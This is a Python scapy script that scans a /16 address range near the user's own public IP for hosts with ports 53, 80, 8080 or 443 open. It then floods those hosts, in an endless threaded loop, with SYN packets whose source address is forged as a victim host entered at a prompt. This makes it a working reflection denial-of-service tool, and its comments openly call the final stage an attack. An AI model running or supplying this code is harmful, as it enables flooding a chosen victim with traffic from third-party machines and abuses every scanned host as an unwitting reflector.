from requests import get
from scapy.all import *
import time
import threading

# get your own ip to make a better spoof source that will hopefully not get filtered
ip = get('https://api.ipify.org').text
print('IP:'+ ip)

# insert your target here:
remoteIPInput = input("Host to spoof: ")
spoofIP = socket.gethostbyname(remoteIPInput)

sources = []

# split the range
ip_array = ip.split('.')
ip_range = ip_array[0] +'.'+ ip_array[1]

file = open("active_ips.txt", "w")
file.write("ip, port")

# checks for open port at the ip
# writes open ports in sources
# saves ips for later
def scan(remoteIP, port):
    # print("scan: "+ remoteIP +", port: "+ str(port))
    remoteIPHost = socket.gethostbyname(remoteIP)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((remoteIPHost, port))
    if result == 0:
        sources.append({"ip": remoteIP, "port": port})
        message = "open ip: "+ str(remoteIP) +", port: "+ str(port)
        file.write(str(remoteIP) +", "+ str(port))
        print(message)

# send packets with spoofed ip to all active hosts
def spoofSYN(spoofIP, destIP, port):
    packet = IP(src=spoofIP,dst=destIP,ttl=99)/TCP(sport=80,dport=port,seq=12345,ack=1000,window=1000,flags="S")
    send(packet)

# scan your range or any other range!
# TODO read your saved ips
for ip_oct3 in range(1, 255):
    for ip_oct4 in range(1, 255):
        test_ip = ip_range +'.'+ str(ip_oct3) +'.'+ str(ip_oct4)
        for port in [53, 80, 8080, 443]:
            # direct spoofing of all ips
            # sources.append({"ip": test_ip, "port": port})

            # scan active hosts first and spoof later
            threading.Thread(target=scan, args=(test_ip, port)).start()
    time.sleep(3)
file.close()

# start listening for source ips
def wait_for_source_ips_and_attack():
    print("start attack!")
    while True:
        for source in sources:
            print("send fake packet from "+ source["ip"])
            threading.Thread(target=spoofSYN, args=(spoofIP, source["ip"], source["port"])).start()
wait_for_source_ips_and_attack()